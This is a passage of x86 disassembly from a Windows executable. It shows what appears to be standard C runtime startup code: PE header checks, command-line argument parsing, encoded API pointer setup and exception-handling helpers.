  421902:	lea    ecx,[ebp-0x10]
  421905:	call   0x4207b2
  42190a:	mov    eax,DWORD PTR [ebp+0x8]
  42190d:	movzx  ecx,al
  421910:	mov    eax,DWORD PTR [ebp-0x10]
  421913:	mov    eax,DWORD PTR [eax+0x90]
  421919:	movzx  eax,WORD PTR [eax+ecx*2]
  42191d:	and    eax,0x8000
  421922:	cmp    BYTE PTR [ebp-0x4],0x0
  421926:	je     0x42192f
  421928:	mov    ecx,DWORD PTR [ebp-0x8]
  42192b:	and    DWORD PTR [ecx+0x70],0xfffffffd
  42192f:	mov    esp,ebp
  421931:	pop    ebp
  421932:	ret    
  421933:	push   ebp
  421934:	mov    ebp,esp
  421936:	mov    eax,DWORD PTR [ebp+0x8]
  421939:	push   DWORD PTR [eax*8+0x430860]
  421940:	call   DWORD PTR ds:0x4290c4
  421946:	pop    ebp
  421947:	ret    
  421948:	push   0x14
  42194a:	push   0x42d9a8
  42194f:	call   0x4221c0
  421954:	call   0x421e4f
  421959:	movzx  esi,ax
  42195c:	push   0x2
  42195e:	call   0x421dc4
  421963:	pop    ecx
  421964:	mov    eax,0x5a4d
  421969:	cmp    WORD PTR ds:0x400000,ax
  421970:	je     0x421976
  421972:	xor    ebx,ebx
  421974:	jmp    0x4219a9
  421976:	mov    eax,ds:0x40003c
  42197b:	cmp    DWORD PTR [eax+0x400000],0x4550
  421985:	jne    0x421972
  421987:	mov    ecx,0x10b
  42198c:	cmp    WORD PTR [eax+0x400018],cx
  421993:	jne    0x421972
  421995:	xor    ebx,ebx
  421997:	cmp    DWORD PTR [eax+0x400074],0xe
  42199e:	jbe    0x4219a9
  4219a0:	cmp    DWORD PTR [eax+0x4000e8],ebx
  4219a6:	setne  bl
  4219a9:	mov    DWORD PTR [ebp-0x1c],ebx
  4219ac:	call   0x41f9c8
  4219b1:	test   eax,eax
  4219b3:	jne    0x4219bd
  4219b5:	push   0x1c
  4219b7:	call   0x421a98
  4219bc:	pop    ecx
  4219bd:	call   0x4217ae
  4219c2:	test   eax,eax
  4219c4:	jne    0x4219ce
  4219c6:	push   0x10
  4219c8:	call   0x421a98
  4219cd:	pop    ecx
  4219ce:	call   0x41f275
  4219d3:	and    DWORD PTR [ebp-0x4],0x0
  4219d7:	call   0x4211e1
  4219dc:	test   eax,eax
  4219de:	jns    0x4219e8
  4219e0:	push   0x1b
  4219e2:	call   0x421a98
  4219e7:	pop    ecx
  4219e8:	call   DWORD PTR ds:0x429038
  4219ee:	mov    ds:0x433bfc,eax
  4219f3:	call   0x41f9dd
  4219f8:	mov    ds:0x431db4,eax
  4219fd:	call   0x41f392
  421a02:	test   eax,eax
  421a04:	jns    0x421a0e
  421a06:	push   0x8
  421a08:	call   0x421176
  421a0d:	pop    ecx
  421a0e:	call   0x4206d1
  421a13:	test   eax,eax
  421a15:	jns    0x421a1f
  421a17:	push   0x9
  421a19:	call   0x421176
  421a1e:	pop    ecx
  421a1f:	push   0x1
  421a21:	call   0x420ebd
  421a26:	pop    ecx
  421a27:	test   eax,eax
  421a29:	je     0x421a32
  421a2b:	push   eax
  421a2c:	call   0x421176
  421a31:	pop    ecx
  421a32:	call   0x421530
  421a37:	push   esi
  421a38:	push   eax
  421a39:	push   0x0
  421a3b:	push   0x400000
  421a40:	call   0x41b0c0
  421a45:	mov    esi,eax
  421a47:	mov    DWORD PTR [ebp-0x24],esi
  421a4a:	test   ebx,ebx
  421a4c:	jne    0x421a54
  421a4e:	push   esi
  421a4f:	call   0x41f261
  421a54:	call   0x4215e6
  421a59:	jmp    0x421a89
  421a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  421a5e:	mov    eax,DWORD PTR [ecx]
  421a60:	mov    eax,DWORD PTR [eax]
  421a62:	mov    DWORD PTR [ebp-0x20],eax
  421a65:	push   ecx
  421a66:	push   eax
  421a67:	call   0x420178
  421a6c:	pop    ecx
  421a6d:	pop    ecx
  421a6e:	ret    
  421a6f:	mov    esp,DWORD PTR [ebp-0x18]
  421a72:	mov    esi,DWORD PTR [ebp-0x20]
  421a75:	mov    DWORD PTR [ebp-0x24],esi
  421a78:	cmp    DWORD PTR [ebp-0x1c],0x0
  421a7c:	jne    0x421a84
  421a7e:	push   esi
  421a7f:	call   0x41f883
  421a84:	call   0x41efc0
  421a89:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  421a90:	mov    eax,esi
  421a92:	call   0x422205
  421a97:	ret    
  421a98:	push   ebp
  421a99:	mov    ebp,esp
  421a9b:	cmp    DWORD PTR ds:0x432630,0x1
  421aa2:	jne    0x421aa9
  421aa4:	call   0x420cde
  421aa9:	push   DWORD PTR [ebp+0x8]
  421aac:	call   0x4202d3
  421ab1:	push   0xff
  421ab6:	call   0x4211cb
  421abb:	pop    ecx
  421abc:	pop    ecx
  421abd:	pop    ebp
  421abe:	ret    
  421abf:	push   ebp
  421ac0:	mov    ebp,esp
  421ac2:	mov    eax,DWORD PTR [ebp+0xc]
  421ac5:	push   ebx
  421ac6:	push   esi
  421ac7:	mov    esi,DWORD PTR [ebp+0x8]
  421aca:	xor    ebx,ebx
  421acc:	sub    eax,esi
  421ace:	add    eax,0x3
  421ad1:	shr    eax,0x2
  421ad4:	cmp    DWORD PTR [ebp+0xc],esi
  421ad7:	push   edi
  421ad8:	sbb    edi,edi
  421ada:	not    edi
  421adc:	and    edi,eax
  421ade:	jbe    0x421af0
  421ae0:	mov    eax,DWORD PTR [esi]
  421ae2:	test   eax,eax
  421ae4:	je     0x421ae8
  421ae6:	call   eax
  421ae8:	add    esi,0x4
  421aeb:	inc    ebx
  421aec:	cmp    ebx,edi
  421aee:	jb     0x421ae0
  421af0:	pop    edi
  421af1:	pop    esi
  421af2:	pop    ebx
  421af3:	pop    ebp
  421af4:	ret    
  421af5:	push   0x1c
  421af7:	push   0x42da18
  421afc:	call   0x4221c0
  421b01:	push   0x8
  421b03:	call   0x41fabe
  421b08:	pop    ecx
  421b09:	and    DWORD PTR [ebp-0x4],0x0
  421b0d:	cmp    DWORD PTR ds:0x431dbc,0x1
  421b14:	je     0x421be3
  421b1a:	mov    DWORD PTR ds:0x431de4,0x1
  421b24:	mov    al,BYTE PTR [ebp+0x10]
  421b27:	mov    ds:0x431de0,al
  421b2c:	cmp    DWORD PTR [ebp+0xc],0x0
  421b30:	jne    0x421bd2
  421b36:	push   DWORD PTR ds:0x433bf0
  421b3c:	mov    esi,DWORD PTR ds:0x429048
  421b42:	call   esi
  421b44:	mov    ebx,eax
  421b46:	mov    DWORD PTR [ebp-0x2c],ebx
  421b49:	test   ebx,ebx
  421b4b:	je     0x421bc1
  421b4d:	push   DWORD PTR ds:0x433bec
  421b53:	call   esi
  421b55:	mov    edi,eax
  421b57:	mov    DWORD PTR [ebp-0x1c],ebx
  421b5a:	mov    DWORD PTR [ebp-0x20],edi
  421b5d:	mov    DWORD PTR [ebp-0x24],edi
  421b60:	sub    edi,0x4
  421b63:	mov    DWORD PTR [ebp-0x24],edi
  421b66:	cmp    edi,ebx
  421b68:	jb     0x421bc1
  421b6a:	push   0x0
  421b6c:	call   DWORD PTR ds:0x429044
  421b72:	cmp    DWORD PTR [edi],eax
  421b74:	je     0x421b60
  421b76:	cmp    edi,ebx
  421b78:	jb     0x421bc1
  421b7a:	push   DWORD PTR [edi]
  421b7c:	call   esi
  421b7e:	mov    esi,eax
  421b80:	push   0x0
  421b82:	call   DWORD PTR ds:0x429044
  421b88:	mov    DWORD PTR [edi],eax
  421b8a:	call   esi
  421b8c:	push   DWORD PTR ds:0x433bf0
  421b92:	mov    esi,DWORD PTR ds:0x429048
  421b98:	call   esi
  421b9a:	mov    DWORD PTR [ebp-0x28],eax
  421b9d:	push   DWORD PTR ds:0x433bec
  421ba3:	call   esi
  421ba5:	mov    ecx,DWORD PTR [ebp-0x28]
  421ba8:	cmp    DWORD PTR [ebp-0x1c],ecx
  421bab:	jne    0x421bb2
  421bad:	cmp    DWORD PTR [ebp-0x20],eax
  421bb0:	je     0x421b60
  421bb2:	mov    DWORD PTR [ebp-0x1c],ecx
  421bb5:	mov    ebx,ecx
  421bb7:	mov    DWORD PTR [ebp-0x2c],ebx
  421bba:	mov    DWORD PTR [ebp-0x20],eax
  421bbd:	mov    edi,eax
  421bbf:	jmp    0x421b5d
  421bc1:	push   0x429170
  421bc6:	push   0x429160
  421bcb:	call   0x421abf
  421bd0:	pop    ecx
  421bd1:	pop    ecx
  421bd2:	push   0x429178
  421bd7:	push   0x429174
  421bdc:	call   0x421abf
  421be1:	pop    ecx
  421be2:	pop    ecx
  421be3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  421bea:	call   0x421c0f
  421bef:	cmp    DWORD PTR [ebp+0x10],0x0
  421bf3:	jne    0x421c1e
  421bf5:	mov    DWORD PTR ds:0x431dbc,0x1
  421bff:	push   0x8
  421c01:	call   0x421933
  421c06:	pop    ecx
  421c07:	push   DWORD PTR [ebp+0x8]
  421c0a:	call   0x4211cb
  421c0f:	cmp    DWORD PTR [ebp+0x10],0x0
  421c13:	je     0x421c1d
  421c15:	push   0x8
  421c17:	call   0x421933
  421c1c:	pop    ecx
  421c1d:	ret    
  421c1e:	call   0x422205
  421c23:	ret    
  421c24:	push   ebp
  421c25:	mov    ebp,esp
  421c27:	mov    eax,DWORD PTR [ebp+0x14]
  421c2a:	push   ebx
  421c2b:	mov    ebx,DWORD PTR [ebp+0x18]
  421c2e:	push   esi
  421c2f:	mov    esi,DWORD PTR [ebp+0x8]
  421c32:	push   edi
  421c33:	and    DWORD PTR [ebx],0x0
  421c36:	mov    edi,DWORD PTR [ebp+0x10]
  421c39:	mov    DWORD PTR [eax],0x1
  421c3f:	mov    eax,DWORD PTR [ebp+0xc]
  421c42:	test   eax,eax
  421c44:	je     0x421c4e
  421c46:	mov    DWORD PTR [eax],edi
  421c48:	add    eax,0x4
  421c4b:	mov    DWORD PTR [ebp+0xc],eax
  421c4e:	xor    ecx,ecx
  421c50:	mov    DWORD PTR [ebp+0x8],ecx
  421c53:	cmp    BYTE PTR [esi],0x22
  421c56:	jne    0x421c69
  421c58:	xor    eax,eax
  421c5a:	test   ecx,ecx
  421c5c:	sete   al
  421c5f:	inc    esi
  421c60:	mov    ecx,eax
  421c62:	mov    al,0x22
  421c64:	mov    DWORD PTR [ebp+0x8],ecx
  421c67:	jmp    0x421c9e
  421c69:	inc    DWORD PTR [ebx]
  421c6b:	test   edi,edi
  421c6d:	je     0x421c74
  421c6f:	mov    al,BYTE PTR [esi]
  421c71:	mov    BYTE PTR [edi],al
  421c73:	inc    edi
  421c74:	mov    al,BYTE PTR [esi]
  421c76:	inc    esi
  421c77:	mov    BYTE PTR [ebp+0x1b],al
  421c7a:	movzx  eax,al
  421c7d:	push   eax
  421c7e:	call   0x41f295
  421c83:	pop    ecx
  421c84:	test   eax,eax
  421c86:	je     0x421c94
  421c88:	inc    DWORD PTR [ebx]
  421c8a:	test   edi,edi
  421c8c:	je     0x421c93
  421c8e:	mov    al,BYTE PTR [esi]
  421c90:	mov    BYTE PTR [edi],al
  421c92:	inc    edi
  421c93:	inc    esi
  421c94:	mov    al,BYTE PTR [ebp+0x1b]
  421c97:	test   al,al
  421c99:	je     0x421cb4
  421c9b:	mov    ecx,DWORD PTR [ebp+0x8]
  421c9e:	test   ecx,ecx
  421ca0:	jne    0x421c53
  421ca2:	cmp    al,0x20
  421ca4:	je     0x421caa
  421ca6:	cmp    al,0x9
  421ca8:	jne    0x421c53
  421caa:	test   edi,edi
  421cac:	je     0x421cb5
  421cae:	mov    BYTE PTR [edi-0x1],0x0
  421cb2:	jmp    0x421cb5
  421cb4:	dec    esi
  421cb5:	and    DWORD PTR [ebp+0x18],0x0
  421cb9:	cmp    BYTE PTR [esi],0x0
  421cbc:	je     0x421d8c
  421cc2:	mov    al,BYTE PTR [esi]
  421cc4:	cmp    al,0x20
  421cc6:	je     0x421ccc
  421cc8:	cmp    al,0x9
  421cca:	jne    0x421ccf
  421ccc:	inc    esi
  421ccd:	jmp    0x421cc2
  421ccf:	cmp    BYTE PTR [esi],0x0
  421cd2:	je     0x421d8c
  421cd8:	mov    edx,DWORD PTR [ebp+0xc]
  421cdb:	test   edx,edx
  421cdd:	je     0x421ce7
  421cdf:	mov    DWORD PTR [edx],edi
  421ce1:	add    edx,0x4
  421ce4:	mov    DWORD PTR [ebp+0xc],edx
  421ce7:	mov    eax,DWORD PTR [ebp+0x14]
  421cea:	inc    DWORD PTR [eax]
  421cec:	xor    edx,edx
  421cee:	inc    edx
  421cef:	xor    ecx,ecx
  421cf1:	jmp    0x421cf5
  421cf3:	inc    esi
  421cf4:	inc    ecx
  421cf5:	cmp    BYTE PTR [esi],0x5c
  421cf8:	je     0x421cf3
  421cfa:	cmp    BYTE PTR [esi],0x22
  421cfd:	jne    0x421d32
  421cff:	test   cl,0x1
  421d02:	jne    0x421d23
  421d04:	cmp    DWORD PTR [ebp+0x18],0x0
  421d08:	je     0x421d16
  421d0a:	lea    eax,[esi+0x1]
  421d0d:	cmp    BYTE PTR [eax],0x22
  421d10:	jne    0x421d16
  421d12:	mov    esi,eax
  421d14:	jmp    0x421d23
  421d16:	xor    eax,eax
  421d18:	xor    edx,edx
  421d1a:	cmp    DWORD PTR [ebp+0x18],eax
  421d1d:	sete   al
  421d20:	mov    DWORD PTR [ebp+0x18],eax
  421d23:	shr    ecx,1
  421d25:	jmp    0x421d32
  421d27:	dec    ecx
  421d28:	test   edi,edi
  421d2a:	je     0x421d30
  421d2c:	mov    BYTE PTR [edi],0x5c
  421d2f:	inc    edi
  421d30:	inc    DWORD PTR [ebx]
  421d32:	test   ecx,ecx
  421d34:	jne    0x421d27
  421d36:	mov    al,BYTE PTR [esi]
  421d38:	test   al,al
  421d3a:	je     0x421d7d
  421d3c:	cmp    DWORD PTR [ebp+0x18],ecx
  421d3f:	jne    0x421d49
  421d41:	cmp    al,0x20
  421d43:	je     0x421d7d
  421d45:	cmp    al,0x9
  421d47:	je     0x421d7d
  421d49:	test   edx,edx
  421d4b:	je     0x421d77
  421d4d:	movsx  eax,al
  421d50:	push   eax
  421d51:	call   0x41f295
  421d56:	pop    ecx
  421d57:	test   edi,edi
  421d59:	je     0x421d6e
  421d5b:	test   eax,eax
  421d5d:	je     0x421d67
  421d5f:	mov    al,BYTE PTR [esi]
  421d61:	mov    BYTE PTR [edi],al
  421d63:	inc    edi
  421d64:	inc    esi
  421d65:	inc    DWORD PTR [ebx]
  421d67:	mov    al,BYTE PTR [esi]
  421d69:	mov    BYTE PTR [edi],al
  421d6b:	inc    edi
  421d6c:	jmp    0x421d75
  421d6e:	test   eax,eax
  421d70:	je     0x421d75
  421d72:	inc    esi
  421d73:	inc    DWORD PTR [ebx]
  421d75:	inc    DWORD PTR [ebx]
  421d77:	inc    esi
  421d78:	jmp    0x421cec
  421d7d:	test   edi,edi
  421d7f:	je     0x421d85
  421d81:	mov    BYTE PTR [edi],0x0
  421d84:	inc    edi
  421d85:	inc    DWORD PTR [ebx]
  421d87:	jmp    0x421cb9
  421d8c:	mov    edx,DWORD PTR [ebp+0xc]
  421d8f:	pop    edi
  421d90:	pop    esi
  421d91:	pop    ebx
  421d92:	test   edx,edx
  421d94:	je     0x421d99
  421d96:	and    DWORD PTR [edx],0x0
  421d99:	mov    eax,DWORD PTR [ebp+0x14]
  421d9c:	inc    DWORD PTR [eax]
  421d9e:	pop    ebp
  421d9f:	ret    
  421da0:	push   ebp
  421da1:	mov    ebp,esp
  421da3:	mov    ecx,DWORD PTR [ebp+0x8]
  421da6:	xor    eax,eax
  421da8:	cmp    ecx,DWORD PTR [eax*8+0x429ee8]
  421daf:	je     0x421dbb
  421db1:	inc    eax
  421db2:	cmp    eax,0x17
  421db5:	jb     0x421da8
  421db7:	xor    eax,eax
  421db9:	pop    ebp
  421dba:	ret    
  421dbb:	mov    eax,DWORD PTR [eax*8+0x429eec]
  421dc2:	pop    ebp
  421dc3:	ret    
  421dc4:	push   ebp
  421dc5:	mov    ebp,esp
  421dc7:	mov    eax,DWORD PTR [ebp+0x8]
  421dca:	mov    ds:0x432000,eax
  421dcf:	pop    ebp
  421dd0:	ret    
  421dd1:	push   ebp
  421dd2:	mov    ebp,esp
  421dd4:	mov    eax,ds:0x433b60
  421dd9:	xor    eax,DWORD PTR ds:0x4314e0
  421ddf:	je     0x421de8
  421de1:	push   DWORD PTR [ebp+0x8]
  421de4:	call   eax
  421de6:	pop    ebp
  421de7:	ret    
  421de8:	pop    ebp
  421de9:	jmp    DWORD PTR ds:0x4290ac
  421def:	push   ebp
  421df0:	mov    ebp,esp
  421df2:	mov    eax,ds:0x433b64
  421df7:	xor    eax,DWORD PTR ds:0x4314e0
  421dfd:	push   DWORD PTR [ebp+0x8]
  421e00:	je     0x421e06
  421e02:	call   eax
  421e04:	pop    ebp
  421e05:	ret    
  421e06:	call   DWORD PTR ds:0x4290b8
  421e0c:	pop    ebp
  421e0d:	ret    
  421e0e:	push   ebp
  421e0f:	mov    ebp,esp
  421e11:	mov    eax,ds:0x433b68
  421e16:	xor    eax,DWORD PTR ds:0x4314e0
  421e1c:	push   DWORD PTR [ebp+0x8]
  421e1f:	je     0x421e25
  421e21:	call   eax
  421e23:	pop    ebp
  421e24:	ret    
  421e25:	call   DWORD PTR ds:0x4290b0
  421e2b:	pop    ebp
  421e2c:	ret    
  421e2d:	push   ebp
  421e2e:	mov    ebp,esp
  421e30:	mov    eax,ds:0x433b6c
  421e35:	xor    eax,DWORD PTR ds:0x4314e0
  421e3b:	push   DWORD PTR [ebp+0xc]
  421e3e:	push   DWORD PTR [ebp+0x8]
  421e41:	je     0x421e47
  421e43:	call   eax
  421e45:	pop    ebp
  421e46:	ret    
  421e47:	call   DWORD PTR ds:0x4290b4
  421e4d:	pop    ebp
  421e4e:	ret    
  421e4f:	push   ebp
  421e50:	mov    ebp,esp
  421e52:	sub    esp,0x44
  421e55:	lea    eax,[ebp-0x44]
  421e58:	push   eax
  421e59:	call   DWORD PTR ds:0x429070
  421e5f:	test   BYTE PTR [ebp-0x18],0x1
  421e63:	je     0x421e6b
  421e65:	movzx  eax,WORD PTR [ebp-0x14]
  421e69:	jmp    0x421e6e
  421e6b:	push   0xa
  421e6d:	pop    eax
  421e6e:	mov    esp,ebp
  421e70:	pop    ebp
  421e71:	ret    
  421e72:	push   ebp
  421e73:	mov    ebp,esp
  421e75:	mov    eax,ds:0x433b70
  421e7a:	xor    eax,DWORD PTR ds:0x4314e0
  421e80:	je     0x421e8f
  421e82:	push   DWORD PTR [ebp+0x10]
  421e85:	push   DWORD PTR [ebp+0xc]
  421e88:	push   DWORD PTR [ebp+0x8]
  421e8b:	call   eax
  421e8d:	pop    ebp
  421e8e:	ret    
  421e8f:	push   DWORD PTR [ebp+0xc]
  421e92:	push   DWORD PTR [ebp+0x8]
  421e95:	call   DWORD PTR ds:0x429034
  421e9b:	xor    eax,eax
  421e9d:	inc    eax
  421e9e:	pop    ebp
  421e9f:	ret    
  421ea0:	push   ebp
  421ea1:	mov    ebp,esp
  421ea3:	push   ecx
  421ea4:	push   esi
  421ea5:	mov    esi,DWORD PTR ds:0x430858
  421eab:	test   esi,esi
  421ead:	jns    0x421ed4
  421eaf:	mov    eax,ds:0x433bd4
  421eb4:	xor    esi,esi
  421eb6:	xor    eax,DWORD PTR ds:0x4314e0
  421ebc:	mov    DWORD PTR [ebp-0x4],esi
  421ebf:	je     0x421ece
  421ec1:	push   esi
  421ec2:	lea    ecx,[ebp-0x4]
  421ec5:	push   ecx
  421ec6:	call   eax
  421ec8:	cmp    eax,0x7a
  421ecb:	jne    0x421ece
  421ecd:	inc    esi
  421ece:	mov    DWORD PTR ds:0x430858,esi
  421ed4:	xor    eax,eax
  421ed6:	test   esi,esi
  421ed8:	pop    esi
  421ed9:	setg   al
  421edc:	mov    esp,ebp
  421ede:	pop    ebp
  421edf:	ret    
  421ee0:	push   esi
  421ee1:	push   edi
  421ee2:	push   0x42a94c
  421ee7:	call   DWORD PTR ds:0x4290bc
  421eed:	mov    esi,DWORD PTR ds:0x429054
  421ef3:	mov    edi,eax
  421ef5:	push   0x42a968
  421efa:	push   edi
  421efb:	call   esi
  421efd:	xor    eax,DWORD PTR ds:0x4314e0
  421f03:	push   0x42a974
  421f08:	push   edi
  421f09:	mov    ds:0x433b60,eax
  421f0e:	call   esi
  421f10:	xor    eax,DWORD PTR ds:0x4314e0
  421f16:	push   0x42a97c
  421f1b:	push   edi
  421f1c:	mov    ds:0x433b64,eax
  421f21:	call   esi
  421f23:	xor    eax,DWORD PTR ds:0x4314e0
  421f29:	push   0x42a988
  421f2e:	push   edi
  421f2f:	mov    ds:0x433b68,eax
  421f34:	call   esi
  421f36:	xor    eax,DWORD PTR ds:0x4314e0
  421f3c:	push   0x42a994
  421f41:	push   edi
  421f42:	mov    ds:0x433b6c,eax
  421f47:	call   esi
  421f49:	xor    eax,DWORD PTR ds:0x4314e0
  421f4f:	push   0x42a9b0
  421f54:	push   edi
  421f55:	mov    ds:0x433b70,eax
  421f5a:	call   esi
  421f5c:	xor    eax,DWORD PTR ds:0x4314e0
  421f62:	push   0x42a9c0
  421f67:	push   edi
  421f68:	mov    ds:0x433b74,eax
  421f6d:	call   esi
  421f6f:	xor    eax,DWORD PTR ds:0x4314e0
  421f75:	push   0x42a9d4
  421f7a:	push   edi
  421f7b:	mov    ds:0x433b78,eax
  421f80:	call   esi
  421f82:	xor    eax,DWORD PTR ds:0x4314e0
  421f88:	push   0x42a9ec
  421f8d:	push   edi
  421f8e:	mov    ds:0x433b7c,eax
  421f93:	call   esi
  421f95:	xor    eax,DWORD PTR ds:0x4314e0
  421f9b:	push   0x42aa04
  421fa0:	push   edi
  421fa1:	mov    ds:0x433b80,eax
  421fa6:	call   esi
  421fa8:	xor    eax,DWORD PTR ds:0x4314e0
  421fae:	push   0x42aa18
  421fb3:	push   edi
  421fb4:	mov    ds:0x433b84,eax
  421fb9:	call   esi
  421fbb:	xor    eax,DWORD PTR ds:0x4314e0
  421fc1:	push   0x42aa38
  421fc6:	push   edi
  421fc7:	mov    ds:0x433b88,eax
  421fcc:	call   esi
  421fce:	xor    eax,DWORD PTR ds:0x4314e0
  421fd4:	push   0x42aa50
  421fd9:	push   edi
  421fda:	mov    ds:0x433b8c,eax
  421fdf:	call   esi
  421fe1:	xor    eax,DWORD PTR ds:0x4314e0
  421fe7:	push   0x42aa68
  421fec:	push   edi
  421fed:	mov    ds:0x433b90,eax
  421ff2:	call   esi
  421ff4:	xor    eax,DWORD PTR ds:0x4314e0
  421ffa:	push   0x42aa7c
  421fff:	push   edi
  422000:	mov    ds:0x433b94,eax
  422005:	call   esi
  422007:	xor    eax,DWORD PTR ds:0x4314e0
  42200d:	mov    ds:0x433b98,eax
  422012:	push   0x42aa90
  422017:	push   edi
  422018:	call   esi
  42201a:	xor    eax,DWORD PTR ds:0x4314e0
  422020:	push   0x42aaac
  422025:	push   edi
  422026:	mov    ds:0x433b9c,eax
  42202b:	call   esi
  42202d:	xor    eax,DWORD PTR ds:0x4314e0
  422033:	push   0x42aacc
  422038:	push   edi
  422039:	mov    ds:0x433ba0,eax
  42203e:	call   esi
  422040:	xor    eax,DWORD PTR ds:0x4314e0
  422046:	push   0x42aae8
  42204b:	push   edi
  42204c:	mov    ds:0x433ba4,eax
  422051:	call   esi
  422053:	xor    eax,DWORD PTR ds:0x4314e0
  422059:	push   0x42ab08
  42205e:	push   edi
  42205f:	mov    ds:0x433ba8,eax
  422064:	call   esi
  422066:	xor    eax,DWORD PTR ds:0x4314e0
  42206c:	push   0x42ab1c
  422071:	push   edi
  422072:	mov    ds:0x433bac,eax
  422077:	call   esi
  422079:	xor    eax,DWORD PTR ds:0x4314e0
  42207f:	push   0x42ab38
  422084:	push   edi
  422085:	mov    ds:0x433bb0,eax
  42208a:	call   esi
  42208c:	xor    eax,DWORD PTR ds:0x4314e0
  422092:	push   0x42ab4c
  422097:	push   edi
  422098:	mov    ds:0x433bb8,eax
  42209d:	call   esi
  42209f:	xor    eax,DWORD PTR ds:0x4314e0
  4220a5:	push   0x42ab5c
  4220aa:	push   edi
  4220ab:	mov    ds:0x433bb4,eax
  4220b0:	call   esi
  4220b2:	xor    eax,DWORD PTR ds:0x4314e0
  4220b8:	push   0x42ab6c
  4220bd:	push   edi
  4220be:	mov    ds:0x433bbc,eax
  4220c3:	call   esi
  4220c5:	xor    eax,DWORD PTR ds:0x4314e0
  4220cb:	push   0x42ab7c
  4220d0:	push   edi
  4220d1:	mov    ds:0x433bc0,eax
  4220d6:	call   esi
  4220d8:	xor    eax,DWORD PTR ds:0x4314e0
  4220de:	push   0x42ab8c
  4220e3:	push   edi
  4220e4:	mov    ds:0x433bc4,eax
  4220e9:	call   esi
  4220eb:	xor    eax,DWORD PTR ds:0x4314e0
  4220f1:	push   0x42aba8
  4220f6:	push   edi
  4220f7:	mov    ds:0x433bc8,eax
  4220fc:	call   esi
  4220fe:	xor    eax,DWORD PTR ds:0x4314e0
  422104:	push   0x42abbc
  422109:	push   edi
  42210a:	mov    ds:0x433bcc,eax
  42210f:	call   esi
  422111:	xor    eax,DWORD PTR ds:0x4314e0
  422117:	push   0x42abcc
  42211c:	push   edi
  42211d:	mov    ds:0x433bd0,eax
  422122:	call   esi
  422124:	xor    eax,DWORD PTR ds:0x4314e0
  42212a:	push   0x42abe0
  42212f:	push   edi
  422130:	mov    ds:0x433bd4,eax
  422135:	call   esi
  422137:	xor    eax,DWORD PTR ds:0x4314e0
  42213d:	mov    ds:0x433bd8,eax
  422142:	push   0x42abf0
  422147:	push   edi
  422148:	call   esi
  42214a:	xor    eax,DWORD PTR ds:0x4314e0
  422150:	push   0x42ac10
  422155:	push   edi
  422156:	mov    ds:0x433bdc,eax
  42215b:	call   esi
  42215d:	xor    eax,DWORD PTR ds:0x4314e0
  422163:	pop    edi
  422164:	mov    ds:0x433be0,eax
  422169:	pop    esi
  42216a:	ret    
  42216b:	push   ebp
  42216c:	mov    ebp,esp
  42216e:	push   DWORD PTR [ebp+0x8]
  422171:	call   DWORD PTR ds:0x429098
  422177:	pop    ebp
  422178:	ret    
  422179:	push   ebp
  42217a:	mov    ebp,esp
  42217c:	push   DWORD PTR [ebp+0x8]
  42217f:	call   DWORD PTR ds:0x4290a0
  422185:	pop    ebp
  422186:	ret    
  422187:	push   ebp
  422188:	mov    ebp,esp
  42218a:	push   DWORD PTR [ebp+0x8]
  42218d:	call   DWORD PTR ds:0x4290a4
  422193:	push   eax
  422194:	call   DWORD PTR ds:0x4290a8
  42219a:	pop    ebp
  42219b:	ret    
  42219c:	push   ebp
  42219d:	mov    ebp,esp
  42219f:	push   0x0
  4221a1:	call   DWORD PTR ds:0x429098
  4221a7:	push   DWORD PTR [ebp+0x8]
  4221aa:	call   DWORD PTR ds:0x429094
  4221b0:	pop    ebp
  4221b1:	ret    
  4221b2:	int3   
  4221b3:	int3   
  4221b4:	int3   
  4221b5:	int3   
  4221b6:	int3   
  4221b7:	int3   
  4221b8:	int3   
  4221b9:	int3   
  4221ba:	int3   
  4221bb:	int3   
  4221bc:	int3   
  4221bd:	int3   
  4221be:	int3   
  4221bf:	int3   
  4221c0:	push   0x420530
  4221c5:	push   DWORD PTR fs:0x0
  4221cc:	mov    eax,DWORD PTR [esp+0x10]
  4221d0:	mov    DWORD PTR [esp+0x10],ebp
  4221d4:	lea    ebp,[esp+0x10]
  4221d8:	sub    esp,eax
  4221da:	push   ebx
  4221db:	push   esi
  4221dc:	push   edi
  4221dd:	mov    eax,ds:0x4314e0
  4221e2:	xor    DWORD PTR [ebp-0x4],eax
  4221e5:	xor    eax,ebp
  4221e7:	push   eax
  4221e8:	mov    DWORD PTR [ebp-0x18],esp
  4221eb:	push   DWORD PTR [ebp-0x8]
  4221ee:	mov    eax,DWORD PTR [ebp-0x4]
  4221f1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4221f8:	mov    DWORD PTR [ebp-0x8],eax
  4221fb:	lea    eax,[ebp-0x10]
  4221fe:	mov    fs:0x0,eax
  422204:	ret    
  422205:	mov    ecx,DWORD PTR [ebp-0x10]
  422208:	mov    DWORD PTR fs:0x0,ecx
  42220f:	pop    ecx
  422210:	pop    edi
  422211:	pop    edi
  422212:	pop    esi
  422213:	pop    ebx
  422214:	mov    esp,ebp
  422216:	pop    ebp
  422217:	push   ecx
  422218:	ret    
  422219:	push   ebp
  42221a:	mov    ebp,esp
  42221c:	push   edi
  42221d:	mov    edi,DWORD PTR [ebp+0xc]
  422220:	test   edi,edi
  422222:	je     0x42225f
  422224:	mov    eax,DWORD PTR [ebp+0x8]
  422227:	test   eax,eax
  422229:	je     0x42225f
  42222b:	push   esi
  42222c:	mov    esi,DWORD PTR [eax]
  42222e:	cmp    esi,edi
  422230:	je     0x42225a
  422232:	push   edi
  422233:	mov    DWORD PTR [eax],edi
  422235:	call   0x4200ab
  42223a:	pop    ecx
  42223b:	test   esi,esi
  42223d:	je     0x42225a
  42223f:	push   esi
  422240:	call   0x41fdda
  422245:	cmp    DWORD PTR [esi],0x0
  422248:	pop    ecx
  422249:	jne    0x42225a
  42224b:	cmp    esi,0x430af0
  422251:	je     0x42225a
  422253:	push   esi
  422254:	call   0x42096f
  422259:	pop    ecx
  42225a:	mov    eax,edi
  42225c:	pop    esi
  42225d:	jmp    0x422261
  42225f:	xor    eax,eax
  422261:	pop    edi
  422262:	pop    ebp
  422263:	ret    
  422264:	push   ebp
  422265:	mov    ebp,esp
  422267:	mov    eax,DWORD PTR [ebp+0x8]
  42226a:	sub    eax,0x3a4
  42226f:	je     0x422297
  422271:	sub    eax,0x4
  422274:	je     0x422290
  422276:	sub    eax,0xd
  422279:	je     0x422289
  42227b:	dec    eax
  42227c:	je     0x422282
